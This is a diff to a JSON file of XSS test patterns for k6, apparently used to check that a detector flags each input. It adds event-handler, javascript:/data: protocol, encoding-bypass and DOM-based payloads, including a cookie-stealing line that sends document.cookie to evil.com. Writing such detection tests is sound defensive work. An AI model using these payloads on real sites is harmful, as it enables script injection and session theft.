@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "xss",
-    "total_patterns": 11,
+    "total_patterns": 21,
     "port": 8002,
     "description": "k6 test patterns for xss"
   },
@@ -123,6 +123,116 @@
       "subcategory": "reflected_xss",
       "payload": "<audio src=x onerror=alert('XSS')>",
       "encoded": "%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_REFL_012",
+      "name": "onclick event handler injection",
+      "category": "xss",
+      "subcategory": "reflected_xss",
+      "payload": "<div onclick=alert(1)>click</div>",
+      "encoded": "%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_REFL_013",
+      "name": "onmouseover event handler injection",
+      "category": "xss",
+      "subcategory": "reflected_xss",
+      "payload": "<a onmouseover=alert(1)>hover</a>",
+      "encoded": "%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_REFL_014",
+      "name": "javascript: protocol in href",
+      "category": "xss",
+      "subcategory": "reflected_xss",
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "encoded": "%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_REFL_015",
+      "name": "data: protocol injection",
+      "category": "xss",
+      "subcategory": "reflected_xss",
+      "payload": "<object data=\"data:text/html,<script>alert(1)<\/script>\">",
+      "encoded": "%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_ENC_001",
+      "name": "HTML entity encoded script tag",
+      "category": "xss",
+      "subcategory": "encoding_bypass",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "encoded": "%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_ENC_002",
+      "name": "Unicode escaped script tag",
+      "category": "xss",
+      "subcategory": "encoding_bypass",
+      "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+      "encoded": "%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_ENC_003",
+      "name": "Mixed case script tag bypass",
+      "category": "xss",
+      "subcategory": "encoding_bypass",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "encoded": "%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_DOM_001",
+      "name": "document.location manipulation",
+      "category": "xss",
+      "subcategory": "dom_based_xss",
+      "payload": "document.location='http://evil.com/?c='+document.cookie",
+      "encoded": "document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_DOM_002",
+      "name": "innerHTML manipulation",
+      "category": "xss",
+      "subcategory": "dom_based_xss",
+      "payload": "innerHTML='<img src=x onerror=alert(1)>'",
+      "encoded": "innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high"
+    },
+    {
+      "id": "XSS_DOM_003",
+      "name": "eval() code injection",
+      "category": "xss",
+      "subcategory": "dom_based_xss",
+      "payload": "eval('alert(document.domain)')",
+      "encoded": "eval('alert(document.domain)')",
       "port": 8002,
       "expected_detection": true,
       "severity": "high"
